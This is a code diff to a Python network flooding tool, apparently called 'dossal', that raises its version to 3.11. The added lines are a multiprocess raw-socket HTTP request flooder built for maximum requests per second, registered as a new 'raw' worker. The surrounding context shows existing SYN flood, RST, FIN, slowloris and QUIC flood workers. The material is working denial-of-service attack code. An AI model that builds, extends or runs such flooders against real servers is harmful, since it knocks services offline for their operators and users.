@@ -25,7 +25,7 @@ from h2.connection import H2Connection
 from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
 
-VERSION = "3.10"
+VERSION = "3.11"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -526,6 +526,61 @@ async def quic_worker(name, url, stats, duration, stop, payload_size=1400):
     stats.packets += total
     stats.bytes += total * plen
 
+# ── Raw HTTP: multiprocess raw socket (max RPS) ───────────────────
+def _mp_http_send(args_tuple):
+    """Multi-process raw socket HTTP sender."""
+    import time as _time
+    host, port, path, duration = args_tuple
+    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
+           f"Connection: keep-alive\r\nUser-Agent: dossal/{VERSION}\r\n\r\n").encode()
+    sent = 0
+    errors = 0
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5.0)
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.connect((host, port))
+        end = _time.time() + duration
+        while _time.time() < end:
+            try:
+                s.sendall(req)
+                data = s.recv(65535)
+                if not data:
+                    break
+                sent += 1
+            except Exception:
+                break
+        s.close()
+    except Exception:
+        errors += 1
+    return sent, errors
+
+async def raw_worker(name, url, stats, duration, stop, payload_size=0):
+    """Raw HTTP multiprocess worker: max RPS via raw socket."""
+    host, port, path = parse_http(url)
+    n_procs = max(1, min(16, _UDP_NPROCS[0]))
+    
+    import multiprocessing as mp
+    import time as _time_mp
+    ctx = mp.get_context('spawn')
+    targets = [(host, port, path, duration)] * n_procs
+    pool = ctx.Pool(n_procs)
+    async_result = pool.map_async(_mp_http_send, targets)
+    
+    loop = asyncio.get_event_loop()
+    try:
+        results = await loop.run_in_executor(None, async_result.get, duration + 5)
+    except Exception:
+        results = [(0, 0)] * n_procs
+    finally:
+        pool.terminate()
+        pool.join()
+    
+    for sent, errors in results:
+        stats.requests += sent
+        stats.errors += errors
+    stats.conns += n_procs
+
 # ── SYN flood: connect only, never read ──────────────────────────
 async def syn_worker(name, url, stats, duration, stop, payload_size=0):
     host, port = parse_ip_port(url)
@@ -664,7 +719,8 @@ WORKERS = {
     "synack":    synack_worker,
     "rst":       rst_worker,
     "fin":       fin_worker,
-    "slowloris": slowloris_worker,
+    'slowloris': slowloris_worker,
+    'raw': raw_worker,
 }
 
 DEFAULT_PAYLOADS = {
